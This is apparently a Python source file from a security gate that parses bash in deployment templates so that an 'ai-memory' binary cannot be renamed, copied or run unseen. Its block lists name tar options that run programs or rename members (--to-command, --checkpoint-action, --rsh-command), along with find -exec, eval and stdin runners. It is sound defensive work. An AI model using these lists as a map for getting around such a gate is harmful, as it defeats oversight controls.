TAR_EXEC_OPTS = ("-I", "-F", "--use-compress-program", "--to-command", "--checkpoint-action", "--info-script",
                 "--new-volume-script", "--rsh-command", "--rmt-command")
# tar options that rename members as they are written: the gate finds the binary by its
# name, so a rename hides it (#5093). GNU tar takes any unambiguous prefix of a long option.
TAR_RENAME_OPTS = ("--transform", "--xform", "--rename")
TAR_ENV_HIT = "TAR_OPTIONS set: tar reads options from it, so it can rename members or run a program"
BUILT_NAME_HIT = ("variable name built from an expansion (the gate cannot read which name it sets, "
                  "and TAR_OPTIONS is one)")
# options that take a value (not a name) as the next word, per name-taking builtin (#5326)
# (env -S splits its value into assignments, so it is read as a name word)
BUILT_NAME_VALUE_OPTS = {"read": "dnNptui", "mapfile": "dnOsuCc", "readarray": "dnOsuCc", "env": "uC"}


def expanded(word: str) -> bool:
    """True when the word holds a parameter expansion or a command substitution."""
    return "$" in word or "`" in word


def built_name(text: str) -> bool:
    """True when a builtin that sets a variable by name (export, declare, typeset, local,
    readonly, env, read, mapfile, readarray, getopts, printf -v) is given a name, or an
    option, built from an expansion (#5326). The TAR_OPTIONS check reads the literal name
    only, and "${N}IONS" or "TAR_$T" can be that name; fail closed (#4869)."""
    plain = re.sub(r"[\"'\\]", "", text)
    for m in re.finditer(r"(?<![\w$./-])(export|declare|typeset|local|readonly|env|read|mapfile|readarray"
                         r"|getopts|printf)(?![\w-])([^;&|\n]*)", plain):
        cmd, words, i = m.group(1), m.group(2).split(), 0
        if cmd == "printf":
            if words[:1] == ["--"]:
                words = words[1:]
            if words[:1] == ["-v"] and len(words) > 1 and expanded(words[1]):
                return True
            if words[:1] and words[0].startswith("-v") and expanded(words[0]):
                return True
            continue
        if cmd == "getopts":
            if len(words) > 1 and expanded(words[1]):
                return True
            continue
        while i < len(words):
            w = words[i]
            if re.match(r"\d*(<<<|<<-?|<>|>>|>\||[<>]&?)$", w):
                i += 2
                continue
            if re.match(r"\d*[<>]", w):
                i += 1
                continue
            if w.startswith("-") and not expanded(w):
                arg = BUILT_NAME_VALUE_OPTS.get(cmd, "")
                i += 2 if w[-1:] in arg and len(w) == 2 else 1
                continue
            if expanded(w.split("=", 1)[0]):
                return True
            if cmd == "env" and "=" not in w:
                break
            i += 1
    return False

# short tar options that run a program or rename (bsdtar -s), alone or in a cluster
TAR_EXEC_SHORT = "IFs"
# short tar options that take a value: the rest of the cluster, or else the next word
TAR_ARG_SHORT = "bCfFgHIKLNTVX"
# find actions that run a command per file: its operands come from the file system (#5093)
FIND_EXEC_ACTIONS = {"-exec", "-execdir", "-ok", "-okdir"}


def tar_risky(args: list):
    """The first tar argument that runs a program or renames members, or None (#5093):
    an exec or rename long option or any prefix of one, or a short option cluster (also
    the dashless first-argument form) holding I, F or s. Each word is read after quote
    removal (bash hands tar --transform for --"tra"nsform), redirections are skipped, and
    the words that short options in TAR_ARG_SHORT take as their value are consumed. A
    word whose option name, or whose start, is an expansion can be any option, and GNU
    tar takes options anywhere, so it is refused too (fail closed, #5328)."""
    k, take = 0, 0
    while k < len(args):
        raw = args[k]
        rm = REDIR_RE.match(raw)
        if rm is not None and not raw.startswith(("<(", ">(")):
            k += 1 if rm.group(1) else 2
            continue
        a, exp = unquote(raw)
        first = k == 0
        k += 1
        if take:
            take -= 1
            continue
        if a == "--" and not exp:
            break
        if exp and a[:1] in "$`":
            return raw
        if a.startswith("--"):
            key = a.split("=", 1)[0]
            if exp and expanded(key):
                return raw
            if len(key) > 3 and any(o.startswith(key) for o in TAR_EXEC_OPTS + TAR_RENAME_OPTS if o.startswith("--")):
                return raw
            continue
        if re.fullmatch(r"-[A-Za-z]\S*", a) or (first and re.fullmatch(r"[A-Za-z]+", a)):
            letters = a.lstrip("-")
            if any(c in TAR_EXEC_SHORT for c in re.match(r"[A-Za-z]*", letters).group(0)):
                return raw
            if a.startswith("-"):
                m = re.match(r"([^%s]*)([%s]?)(.*)" % (TAR_ARG_SHORT, TAR_ARG_SHORT), letters)
                if exp and expanded(m.group(1)):
                    return raw
                take = 1 if m.group(2) and not m.group(3) else 0
            else:
                take = sum(c in TAR_ARG_SHORT for c in letters)
    return None


def mask_expansions(val: str) -> str:
    """val with each expansion ($NAME, ${..}, $(..), $((..)), backticks, $@ ...) replaced by
    one U+0001 mark, which stands for any text (#5094)."""
    out, i, n = [], 0, len(val)
    while i < n:
        c = val[i]
        if c == "`":
            j = val.find("`", i + 1)
            i = n if j < 0 else j + 1
            out.append("\x01")
            continue
        if c == "$" and i + 1 < n:
            d = val[i + 1]
            if d in "({":
                close, depth, j = (")" if d == "(" else "}"), 0, i + 1
                while j < n:
                    if val[j] == d:
                        depth += 1
                    elif val[j] == close:
                        depth -= 1
                        if depth == 0:
                            break
                    j += 1
                i = j + 1
                out.append("\x01")
                continue
            m = re.match(r"[A-Za-z_]\w*|[0-9@*#?$!-]", val[i + 1:])
            if m is not None:
                i += 1 + m.end()
                out.append("\x01")
                continue
        out.append(c)
        i += 1
    return "".join(out)


def built_name_matches(val: str, globs: bool = True) -> bool:
    """True when a word the shell builds (a brace or glob) can expand to a path whose
    basename is ai-memory (fail closed, #5093). Braces are expanded first, so a brace that
    holds a slash is read whole; a range, or more than 64 words, counts as any text."""
    alts, rounds = [mask_expansions(val)], 0
    while globs and rounds < 16 and any(re.search(r"\{[^{}]*\}", a) for a in alts):
        rounds += 1
        nxt = []
        for a in alts:
            m = re.search(r"\{([^{}]*)\}", a)
            if m is None:
                nxt.append(a)
            elif ".." in m.group(1) or "," not in m.group(1):
                # a range, or a literal {x}: stands for any text here (fail closed)
                nxt.append(a[:m.start()] + "*" + a[m.end():])
            else:
                nxt.extend(a[:m.start()] + alt + a[m.end():] for alt in m.group(1).split(","))
        alts = nxt
        if len(alts) > 64:
            return True
    for a in alts:
        pat = re.sub(r"\[[^]]*\]?|\*|\x01" if globs else r"\x01", "\0", posixpath.basename(a))
        pat = "".join(".*" if c == "\0" else ("." if c == "?" and globs else re.escape(c)) for c in pat)
        if re.fullmatch(pat, "ai-memory", re.S) is not None:
            return True
    return False


# commands and keywords that never run an operand: they print it, fetch it as a URL, or
# match or loop over it as text, so a bare unresolved expansion is safe there (#5094)
PRINT_ONLY = {"echo", "printf", "curl", "for", "case", "select"}


class VarFacts(frozenset):
    """The tracked binary names (the set) plus .resolved: the names whose every value the
    gate can read (#5094). None means unknown, and then no name is resolved."""
    resolved = None


def bare_operand_problem(words: list, idx, bins):
    """#5094 closed world: an operand that is one bare expansion ("$X", ${X}, $(..)) of a
    command that may run it must have a value the gate can read. A named variable that is
    only set by a substitution, read, mapfile, printf -v, getopts, a loop over such a
    value, or never set in the template is unresolved, and so is a substitution itself.
    Positional parameters resolve at the call site, whose operands this same rule reads."""
    if idx is None:
        return None
    base = posixpath.basename(unquote(words[idx])[0])
    if base in KNOWN_NONEXEC or base in PRINT_ONLY or base == "ai-memory":
        return None
    resolved = getattr(bins, "resolved", None) or frozenset()
    runner = base in SHELLS or base in STDIN_RUNNERS or INTERP_BASE_RE.match(base) is not None
    k = idx + 1
    while k < len(words):
        w = words[k]
        rm = REDIR_RE.match(w)
        if rm is not None and not w.startswith(("<(", ">(")):
            op = w[:len(w) - len(rm.group(1))]
            tgt = rm.group(1) or (words[k + 1] if k + 1 < len(words) else "")
            k += 1 if rm.group(1) else 2
            # a shell or interpreter runs what its stdin redirection or here-string names
            # (#5095): that target must resolve like an operand; a heredoc body is read
            # by rule R3 as script text
            if not (runner and "<" in op and ">" not in op and not re.fullmatch(r"\d*<<-?", op)):
                continue
            w = tgt
        else:
            k += 1
        val, exp = unquote(w)
        if not exp or mask_expansions(val) != "\x01":
            continue
        # only a plain $X or ${X} reads a resolved name's value: an operator, default,
        # indirection, length, case or subscript form builds other text (fail closed, #5173)
        m = re.fullmatch(r"\$(?:([A-Za-z_]\w*)|\{([A-Za-z_]\w*)\})", val)
        if m is None and re.fullmatch(r"\$(?:[0-9@*#?$!-]|\{(?:[0-9]+|[@*#?$!-])\})", val):
            continue
        name = None if m is None else (m.group(1) or m.group(2))
        if name is None or (name not in resolved and name not in bins):
            return ("%r is an operand of %r whose value the gate cannot read (an unresolved expansion may "
                    "name the ai-memory binary)" % (scrub(w)[:40], base))
    return None


def binary_ref(w: str, bins, shells: bool = False) -> bool:
    """True when w is one word naming the ai-memory binary: its text's basename is
    ai-memory, or it is exactly the expansion of a variable the template assigns such
    a path to. With shells, a shell or interpreter name counts too (it can run one)."""
    val, exp = unquote(w)
    # $B, ${B} and every operator form ${B%x}, ${B:-x}, ${#B}, ${!B}, ${B[0]} of a tracked
    # name (#5094); checked before the space test, since an operator word may hold one
    if any(re.fullmatch(r"\$" + re.escape(b) + r"|\$\{[#!]?" + re.escape(b) + r"(?:[^A-Za-z0-9_].*)?\}", val, re.S)
           for b in bins):
        return True
    masked = mask_expansions(val) if exp else val
    if re.search(r"\s", masked):
        return False
    # a data home (/etc/ai-memory) shares the binary's basename. It stays a binary
    # reference here (fail closed: a file can be installed at that path); running a
    # data home is also an R5 hit, which the #4998 probe requires to be reported.
    base = posixpath.basename(val)
    if base == "ai-memory" or (shells and (base in SHELLS or INTERP_BASE_RE.match(base))):
        return True
    # only an unquoted glob or brace is expanded by the shell; a quoted one is literal text
    globs = re.search(r"[*?\[{]", unquoted_chars(w)) is not None
    if globs and built_name_matches(val):
        return True
    # a name built from an expansion (/dir/$N, ai-$V, ${D}ai-memory) may be ai-memory: each
    # expansion stands for any text (#5094). A bare expansion with no slash and no literal
    # text is the unresolved-variable case, decided by bare_operand_problem.
    if exp and "\x01" in masked and ("/" in masked or re.search(r"[^\x01]", posixpath.basename(masked))):
        return built_name_matches(val, globs)
    return False


def copy_problem(base: str, args: list, bins):
    """cp/ln/mv/install that copies the binary to another name (#4837 R12)."""
    opts, ops, target_dir, k = COPY_CMDS[base], [], False, 0
    while k < len(args):
        a = args[k]
        rm = REDIR_RE.match(a)
        if rm is not None and not a.startswith(("<(", ">(")):
            k += 1 if rm.group(1) else 2
            continue
        if a == "--":
            ops.extend(args[k + 1:])
            break
        if a.startswith("-") and a != "-":
            key = a.split("=", 1)[0]
            if base == "install" and (key == "--directory" or (not a.startswith("--") and "d" in a[1:])):
                return None
            if key in ("-t", "--target-directory") or (not a.startswith("--") and a[1:].endswith("t") and len(a) > 2):
                target_dir = True
            k += 2 if (key in opts or key in ("-t", "--target-directory")) and "=" not in a and len(key) == len(a) else 1
            continue
        ops.append(a)
        k += 1
    if any(binary_ref(o, bins) for o in ops) and any(re.search(r"[*?\[{]", unquote(o)[0]) for o in ops):
        return "%s copies the ai-memory binary with a brace or glob operand (the copy's name is not readable)" % base
    if target_dir or len(ops) < 2:
        return None
    dest = unquote(ops[-1])[0]
    if any(binary_ref(src, bins) for src in ops[:-1]) and not dest.endswith("/") and posixpath.basename(dest) != "ai-memory":
        return "%s copies the ai-memory binary to another name %r (the gate finds the binary by its name)" % (base, scrub(ops[-1])[:40])
    return None


def operand_problem(words: list, idx, bins):
    """#4837 R4/R12: a word naming the binary must be the resolved command word, or an
    operand of a command known never to run it."""
    base = None if idx is None else posixpath.basename(unquote(words[idx])[0])
    shells = base not in KNOWN_NONEXEC and base != "ai-memory"
    refs, k = [], 0
    while k < len(words):
        w = words[k]
        rm = REDIR_RE.match(w)
        if rm is not None and not w.startswith(("<(", ">(")):
            k += 1 if rm.group(1) else 2
            continue
        if k != idx and not ASSIGN_RE.match(w) and binary_ref(w, bins, shells):
            refs.append(k)
        k += 1
    if base == "tar":
        risky = tar_risky(words[idx + 1:])
        if risky is not None:
            # the archive's members are not visible here: a program option or a rename is
            # red whatever the operands name (#5093)
            return "tar option %r runs a program or renames members (the gate finds the binary by its name)" % scrub(risky)[:40]
    if base == "find" and any(unquote(a)[0] in FIND_EXEC_ACTIONS for a in words[idx + 1:]):
        return "find runs a command per file (its operands come from the file system, so a copy's name is not readable)"
    if base in COPY_CMDS and any(posixpath.basename(unquote(w)[0]) == "xargs" for w in words[:idx]):
        return "%s under xargs (its operands come from stdin, so a copy's name is not readable)" % base
    if not refs:
        return None
    if base == "ai-memory":
        return None
    if base in COPY_CMDS:
        return copy_problem(base, words[idx + 1:], bins)
    if base in KNOWN_NONEXEC or base == "tar":
        # tar's program and rename options are refused above whatever the operands name;
        # without one, tar only archives or lists the binary
        return None
    lead = " ".join(words[:refs[0]])
    return ("ai-memory is run by or an operand of %r: unknown wrapper (only NAME=value prefixes, %s and the "
            "non-executing %s are understood)" % (scrub(lead)[:60], "/".join(sorted(WRAPPERS)), "/".join(sorted(KNOWN_NONEXEC))))


# ---------------------------------------------------------------- #4837 R12: R5 data files
# A write_files block or heredoc body is DATA (its lines are text, a template value in its
# command word is not a command) ONLY when the gate can show it is never run. The test:
#   1. a write_files block has no shebang, is not a unit, and its permissions parse as
#      octal with no execute bit (absent is the 0644 default; unparsable is executed);
#      a heredoc body is fed to plain ``cat`` whose one output redirect is a literal path
#      (a variable assigned exactly once to a literal is substituted);
#   2. the path is under a DATA_HOMES directory, whose readers parse the file as
#      configuration and never run it (cron.d, profile.d, apt.conf.d, udev rules and the
#      like run their contents, so any other place is executed);
#   3. no statement of the template uses the path, a glob matching it or a parent
#      directory of it, except as an output-redirect target or an operand of DATA_SAFE,
#      chmod with a mode that has no execute bit, install -d, or sed with one literal
#      s-command script that has no e or w flag and whose output is not redirected or piped.
# Anything else is executed: its lines are checked as script lines. A no-shebang file that
# a later line runs (bash PATH, PATH as a command, . PATH, ExecStart=PATH) is executed.
DATA_HOMES = ("/etc/ai-memory/", "/opt/ai-memory/.config/ai-memory/", "/etc/pgbouncer/")
# commands that run the words or text they read on stdin (#5095)
STDIN_RUNNERS = {"xargs", "parallel", "source", ".", "eval", "env"}
DATA_SAFE = {"chown", "chgrp", "test", "[", "[[", "stat", "ls", "rm", "echo", "printf", "tee", "mkdir", "useradd"}
SED_SUBST_RE = re.compile(r"^s([^\\\n])(?:\\.|(?!\1).)*\1(?:\\.|(?!\1).)*\1[gpI0-9]*$", re.S)


def mode_has_x(mode: str) -> bool:
    """True when a chmod/install mode word grants execute (or cannot be read)."""
    m = unquote(mode)[0]
    if re.fullmatch(r"[0-7]{1,4}", m):
        return int(m, 8) & 0o111 != 0
    return not re.fullmatch(r"[ugoa]*[-+=][rwstugo]*(?:,[ugoa]*[-+=][rwstugo]*)*", m)


def sed_reads_only(args: list, term: str) -> bool:
    if term == "|":
        return False
    scripts, k = [], 0
    while k < len(args):
        a = args[k]
        rm = REDIR_RE.match(a)
        if rm is not None and not a.startswith(("<(", ">(")):
            if ">" in a[:len(a) - len(rm.group(1))]:
                return False
            k += 1 if rm.group(1) else 2
            continue
        if a in ("-n", "-E", "-r", "--quiet", "--silent"):
            k += 1
            continue
        if a == "-e":
            scripts.append(args[k + 1] if k + 1 < len(args) else "")
            k += 2
            continue
        if a.startswith("-"):
            return False
        if not scripts:
            scripts.append(a)
        k += 1
    if len(scripts) != 1:
        return False
    s = scripts[0]
    return (len(s) > 2 and s[0] == "'" and s[-1] == "'" and "'" not in s[1:-1]
            and SED_SUBST_RE.match(s[1:-1]) is not None)


def literal_consts(stmts: list) -> dict:
    """NAME -> value for every variable assigned exactly once, to a bare literal, and
    named nowhere else except as $NAME / ${NAME}."""
    texts = [tf_render(s) for _w, s, _st in stmts]
    whole = "\n".join(texts)
    out = {}
    for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)=(\S+)", whole):
        name, val = m.group(1), m.group(2)
        if name in out or not BARE_LITERAL_RE.match(val):
            continue
        if len(re.findall(r"(?<![\w${])" + re.escape(name) + r"(?!\w)", whole)) == 1:
            out[name] = val
    return out


def subst_consts(w: str, consts: dict) -> str:
    def rep(m):
        return consts.get(m.group(1) or m.group(2), m.group(0))
    return re.sub(r"\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)", rep, w)


def writes_out(words: list) -> bool:
    """True when the command's output goes to a file other than /dev/null (#5096)."""
    k = 0
    while k < len(words):
        w = words[k]
        rm = REDIR_RE.match(w)
        if rm is not None and not w.startswith(("<(", ">(")):
            op = w[:len(w) - len(rm.group(1))]
            tgt = unquote(rm.group(1) or (words[k + 1] if k + 1 < len(words) else ""))[0]
            if ">" in op and "<" not in op and not re.fullmatch(r"\d*>&\d*-?", op + tgt) and tgt != "/dev/null":
                return True
            k += 1 if rm.group(1) else 2
            continue
        k += 1
    return False


def path_uses(stmt: str, consts: dict, out: list, depth: int = 0, in_sub: bool = False) -> None:
    """Append (text, safe) for every word of stmt, its -c scripts and substitutions.
    Nothing is safe in a command (other than chmod/chown/chgrp/mkdir, which print no
    content) or a { } / ( ) group whose output goes to a file, in tee's stdin, or for
    echo/printf/tee inside a substitution, whose output becomes words (#5096: a safe
    read must not be a copy)."""
    t = tokenize(stmt) if depth <= 8 else None
    if t is None:
        out.append((subst_consts(stmt, consts), False))
        return
    cmds, subs, _ansi = t
    grouped_out, prev = False, ""
    for words, _pipe_in, term in cmds:
        if (words[:1] in (["}"], [")"]) or prev == ")") and writes_out(words):
            grouped_out = True
        prev = term
    for ci, (words, _pipe_in, term) in enumerate(cmds):
        idx, scripts = resolve(words)
        for sv, _sexp in scripts:
            path_uses(sv, consts, out, depth + 1)
        base = None if idx is None else posixpath.basename(unquote(words[idx])[0])
        rest = [] if idx is None else words[idx + 1:]
        if base in SHELLS or (base is not None and INTERP_BASE_RE.match(base)):
            has_c, sw = shell_script_word(base, rest)
            if has_c and sw is not None:
                path_uses(unquote(sw)[0], consts, out, depth + 1)
        safe = base in DATA_SAFE and not (in_sub and base in ("echo", "printf", "tee"))
        nxt = cmds[ci + 1][0] if term == "|" and ci + 1 < len(cmds) else None
        if nxt:
            # words piped into a shell, an interpreter or xargs are run, not data (#5095)
            # the wrappers too: resolve() looks through xargs and env to the command they run
            ni, _ns = resolve(nxt)
            fi = skip_prefix(nxt, 0)
            last = fi if ni is None else max(ni, fi)
            for nw in nxt[fi:last + 1]:
                nb = posixpath.basename(unquote(nw)[0])
                if nb in SHELLS or nb in STDIN_RUNNERS or INTERP_BASE_RE.match(nb):
                    safe = False
        if base == "chmod":
            # a mode with an execute bit makes the named file runnable; on a parent
            # directory it only grants traversal, so it counts for an exact match only
            mode = next((a for a in rest if not a.startswith("-")), "")
            recursive = any(a == "--recursive" or re.fullmatch(r"-[A-Za-z]*R[A-Za-z]*", a) for a in rest)
            safe = True if not mode_has_x(mode) else (False if recursive else "exact")
        elif base == "install":
            safe = any(a == "--directory" or (re.fullmatch(r"-[A-Za-z]+", a) is not None and "d" in a) for a in rest)
        elif base == "sed":
            safe = sed_reads_only(rest, term)
        if grouped_out or (writes_out(words) and base not in ("chmod", "chown", "chgrp", "mkdir")):
            safe = False
        k = 0
        while k < len(words):
            w = words[k]
            for s in subs:
                w = w.replace(s, "")
            rm = REDIR_RE.match(w)
            if rm is not None and not w.startswith(("<(", ">(")):
                op = w[:len(w) - len(rm.group(1))]
                tgt = rm.group(1) or (words[k + 1] if k + 1 < len(words) else "")
                writes = ">" in op and "<" not in op
                # tee copies its standard input to its file operands: reading a path is a copy
                out.append((unquote(subst_consts(tgt, consts))[0], writes or (safe and base != "tee")))
                k += 1 if rm.group(1) else 2
                continue
            if (idx is None or k < idx) and ASSIGN_RE.match(w):
                # an assignment the consts substitute is followed through its uses
                name = re.match(r"[A-Za-z_]\w*", w).group(0)
                out.append((unquote(subst_consts(w.split("=", 1)[1], consts))[0], name in consts))
            else:
                out.append((unquote(subst_consts(w, consts))[0], safe if k != idx else False))
            k += 1
    for s in subs:
        path_uses(s, consts, out, depth + 1, True)


def use_glob(val: str) -> str:
    """A use's text as a glob over absolute paths (#5095). An expansion, substitution,
    brace or tilde stands for any text; repeated slashes, ./ and ../ segments collapse
    (a ../ after any wildcard may climb anywhere); a relative name may sit under any
    working directory. So no spelling of a path can hide it from rule R5."""
    g = re.sub(r"\$\{[^}]*\}|\$\([^)]*\)|\$\w+|\$[@*#?!$-]|`[^`]*`|\{[^{}]*\}|~[^/]*", "*", val)
    g = re.sub(r"/+", "/", g)
    segs = g.split("/")
    ups = [i for i, sg in enumerate(segs) if sg == ".."]
    if ups and any(re.search(r"[*?\[]", sg) for sg in segs[:ups[-1]]):
        g = "*/" + "/".join(segs[ups[-1] + 1:])
    elif g:
        g = posixpath.normpath(g)
        g = "/" + g.lstrip("/") if g.startswith("/") else g
    if g in (".", ""):
        return ""
    return g if g.startswith(("/", "*")) else "*/" + g


def runs_path(path: str, uses: list) -> bool:
    """True when a use that is not known safe names path, a glob matching it, or a parent.
    Every use is compared in canonical glob form (use_glob, #5095)."""
    return path_runner(path, uses) is not None


# rule R5: data-home path -> the use that made the gate read it as script, kept for the
# self-test failure line only; it never changes a verdict (#5385)
R5_READ_AS_SCRIPT = {}


def path_runner(path: str, uses: list):
    """The first use that runs_path counts as naming path, or None."""
    path = "/" + posixpath.normpath(path).lstrip("/")
    for val, safe in uses:
        if safe is True or not val:
            continue
        g = use_glob(val)
        if g == "/":
            return val
        if not re.search(r"[^*/]", g):
            # a bare expansion names no place; where it is run, bare_operand_problem
            # requires it to resolve (closed world, #5095)
            continue
        wild = re.search(r"[*?\[]", g) is not None
        if safe == "exact":
            if g == path or (wild and fnmatch.fnmatchcase(path, g)):
                return val
            continue
        if path in val or path in g:
            return val
        if wild and fnmatch.fnmatchcase(path, g):
            return val
        # a directory names every file under it; a relative bare word with no slash is
        # not a directory operand the gate can place (systemctl unit names and the like)
        if (g.startswith("/") or "/" in val) and fnmatch.fnmatchcase(path, g.rstrip("/") + "/*"):
            return val
    return None


def file_is_data(path: str, mode, info) -> bool:
    """Rule R5 (see DATA_HOMES): True only when the gate can show path is never run."""
    if info is None:
        return True
    if mode is not None:
        m = mode.strip().strip("'\"")
        if not re.fullmatch(r"[0-7]{3,4}", m) or int(m, 8) & 0o111:
            return False
    if not path.startswith(DATA_HOMES) or ".." in path.split("/"):
        return False
    runner = path_runner(path, info["uses"])
    if runner is not None:
        R5_READ_AS_SCRIPT.setdefault(path, runner)
    return runner is None


def heredoc_target(joined: str, consts: dict):
    """The literal path a ``cat > PATH <<DELIM`` line writes, else None."""
    t = tokenize(tf_render(joined))
    if t is None:
        return None
    cmds, subs, ansi = t
    found = None
    for words, _pipe_in, term in cmds:
        if not any(re.match(r"^\d*<<", w) for w in words):
            continue
        if found is not None or subs or ansi or term == "|":
            return None
        idx, scripts = resolve(words)
        if idx is None or scripts or unquote(words[idx])[0] != "cat":
            return None
        tgt, k = None, idx + 1
        while k < len(words):
            w = words[k]
            rm = REDIR_RE.match(w)
            if rm is None or w.startswith(("<(", ">(")):
                return None
            op = w[:len(w) - len(rm.group(1))]
            arg = rm.group(1) or (words[k + 1] if k + 1 < len(words) else "")
            if op in (">", ">>", ">|"):
                if tgt is not None:
                    return None
                tgt = subst_consts(arg, consts)
            elif not re.fullmatch(r"\d*<<-?", op):
                return None
            k += 1 if rm.group(1) else 2
        if tgt is None:
            return None
        val, exp = unquote(tgt)
        if exp or not BARE_LITERAL_RE.match(val) or not val.startswith("/"):
            return None
        found = val
    return found


def skip_prefix(words: list, i: int) -> int:
    """Skip keywords, assignments and redirections before a command word."""
    while i < len(words):
        w = words[i]
        if w in KEYWORDS or ASSIGN_RE.match(w):
            i += 1
            continue
        rm = REDIR_RE.match(w)
        if rm is not None and not w.startswith("<(") and not w.startswith(">("):
            i += 1 if rm.group(1) else 2
            continue
        break
    return i


def resolve(words: list):
    """Return (index of the command word or None, [(script, expanded)]) after
    skipping wrappers; a -c string given to su/runuser/flock is the command."""
    scripts = []
    i = skip_prefix(words, 0)
    for _ in range(12):
        if i >= len(words):
            return None, scripts
        val, exp = unquote(words[i])
        base = posixpath.basename(val)
        if exp or base not in WRAPPERS:
            return i, scripts
        opts, npos = WRAPPERS[base]
        rest = words[i + 1:]
        if base in ("su", "runuser", "flock"):
            for k, w in enumerate(rest):
                key = w.split("=", 1)[0]
                if key in SCRIPT_OPTS[base]:
                    sv = w.split("=", 1)[1] if "=" in w else (rest[k + 1] if k + 1 < len(rest) else "")
                    scripts.append(unquote(sv))
                    return None, scripts
            if base in ("su", "runuser") and "--" not in rest:
                return None, scripts
        j = i + 1
        while j < len(words):
            w = words[j]
            if w == "--":
                j += 1
                break
            if w.startswith("-") and w != "-":
                key = w.split("=", 1)[0]
                if base in SCRIPT_OPTS and key in SCRIPT_OPTS[base]:
                    sv = w.split("=", 1)[1] if "=" in w else (words[j + 1] if j + 1 < len(words) else "")
                    scripts.append(unquote(sv))
                    return None, scripts
                if key in opts and "=" not in w:
                    j += 2
                else:
                    j += 1
                continue
            if base in ("env", "sudo") and ASSIGN_RE.match(w):
                j += 1
                continue
            break
        if base in ("su", "runuser"):
            j = i + 1 + rest.index("--") + 1
        else:
            j += npos
        i = skip_prefix(words, j)
    return None, scripts + [("", True)]


def shell_script_word(base: str, args: list):
    """For a shell or interpreter: (has_script_option, script word or None)."""
    if base in SHELLS:
        for k, a in enumerate(args):
            if a == "--" or not a.startswith("-") or a.startswith("--"):
                if a.startswith("--") and a != "--":
                    continue
                return False, None
            if "c" in a[1:]:
                for b in args[k + 1:]:
                    if not b.startswith("-") or b == "-":
                        return True, b
                return True, None
        return False, None
    if base.startswith("python"):
        opts = ("-c",)
    elif base in ("awk", "gawk", "mawk"):
        return True, next((a for a in args if not a.startswith("-")), None)
    else:
        opts = INTERP_SCRIPT_OPT.get(base, ("-e",))
    for k, a in enumerate(args):
        if a in opts:
            return True, args[k + 1] if k + 1 < len(args) else None
    return False, None


def companion_hits(stmt: str, st: dict, depth: int = 0, bins=frozenset()) -> list:
    """Refusals for one bash statement (see the module docstring)."""
    if depth > 8:
        return ["nesting deeper than 8 levels"]
    t = tokenize(stmt)
    if t is None:
        if "$" in stmt or "`" in stmt:
            return ["unparsable statement holding $ or a backtick"]
        return []
    cmds, subs, ansi = t
    # Keep the directive-marked words for the ai-memory option check; every other rule reads
    # the words as terraform renders them when the directive's text is kept (#4837 R11).
    # A word that was only a directive is dropped from the words, and its mark moves onto
    # the next kept raw word (or the last one), so a directive standing alone before the
    # subcommand still reaches the ai-memory check (#4837 R12).
    marked = []
    for words, pipe_in, term in cmds:
        kept, raws, carry = [], [], ""
        for w in words:
            plain = w.replace(TF_DIRECTIVE_MARK, "")
            if not plain and w:
                carry = TF_DIRECTIVE_MARK
                continue
            kept.append(plain)
            raws.append(carry + w)
            carry = ""
        if carry and raws:
            raws[-1] += carry
        marked.append((kept, pipe_in, term, raws))
    cmds = [(m[0], m[1], m[2]) for m in marked]
    raw_of = {id(m[0]): m[3] for m in marked}
    subs = [x.replace(TF_DIRECTIVE_MARK, "") for x in subs]
    out = []
    if ansi:
        out.append("ANSI-C or locale quoting ($' or $\")")
    # an extended glob ?( *( +( @( !( ends a word the tokenizer splits at "(": the name it
    # expands to (a data file or the binary) is unreadable, so it is refused (R11). The
    # tokenizer gives a lone "!" for both "! (cmd)" (negation) and "!(x)" (an extended glob
    # as an argument or at command position), so an unquoted "!(" with no blank between
    # is refused from the text (#5325); a quoted "!" before "(" is a bash syntax error
    mask_x, _ = unquoted_mask(stmt, None)
    if (any(term == "(" and words and words[-1] != "!" and words[-1][-1:] in "?*+@!" for words, _p, term in cmds)
            or any(mask_x[i] and stmt[i:i + 2] == "!(" for i in range(len(stmt) - 1))):
        out.append("extended glob pattern (the gate cannot read the name it expands to)")
    runs_shell = False
    decodes = False
    for words, pipe_in, term in cmds:
        if not words:
            if term in (";;", ";&") and st.get("case", 0) > 0:
                st["pattern"] = True
            continue
        if st.get("pattern"):
            if term == ")":
                st["pattern"] = False
            continue
        if words[0] == "esac":
            st["case"] = max(0, st.get("case", 0) - 1)
            st["pattern"] = False
            continue
        idx, scripts = resolve(words)
        for sv, sexp in scripts:
            if sexp:
                out.append("expanded or unresolvable script given to a wrapper (-c/-S)")
            else:
                out.extend(companion_hits(sv, {}, depth + 1, bins))
        if not st.get("data") and not (idx is None and scripts):
            why = operand_problem(words, idx, bins)
            if why is not None:
                out.append(why)
            why = bare_operand_problem(words, idx, bins)
            if why is not None:
                out.append(why)
        if idx is None:
            if term in (";;", ";&") and st.get("case", 0) > 0:
                st["pattern"] = True
            continue
        cw = words[idx]
        if st.get("data") and "$" not in cw.replace(TF_VALUE, "") and "`" not in cw:
            # A data line is one the gate has shown is never run (rule R5, see DATA_HOMES):
            # a template value in it is plain text (#4837 R12).
            cw = cw.replace(TF_VALUE, "TFVALUE")
        val, exp = unquote(cw)
        if exp or "$" in cw or "`" in cw:
            out.append("command word %r is an expansion or command substitution" % scrub(cw)[:40])
            continue
        base = posixpath.basename(val)
        args = words[idx + 1:]
        if not st.get("data") and val not in ("[", "[[") and re.search(r"[*?\[]", val):
            out.append("command word %r is a glob (the command is chosen at run time)" % scrub(cw)[:40])
            continue
        if base == "case":
            st["case"] = st.get("case", 0) + 1
            st["pattern"] = True
            continue
        if term in (";;", ";&") and st.get("case", 0) > 0:
            st["pattern"] = True
        if base == "eval":
            out.append("eval")
        if base == "ai-memory":
            # #4837 R6: the subcommand must be a literal word the serve rule can read.
            if any(posixpath.basename(unquote(w)[0]) == "xargs" for w in words[:idx]):
                out.append("ai-memory under xargs (its subcommand comes from stdin)")
            # #4837 R12 closed world: up to the subcommand every word is a flag word, the
            # value of a value-taking root flag, "--", or the subcommand itself. A value
            # (separate or after "=") must be in the value grammar; the subcommand and the
            # word after "--" must be bare literals. Anything else is red.
            want_value, skip = False, False
            for rw in raw_of[id(words)][idx + 1:]:
                if skip:
                    skip = False
                    if TF_VALUE in rw or TF_DIRECTIVE_MARK in rw:
                        out.append(REDIR_TF_HIT)
                        break
                    continue
                rm = REDIR_RE.match(rw)
                if rm is not None and not rw.startswith(("<(", ">(")):
                    # a redirection is not an argument; bash removes it and its target. The
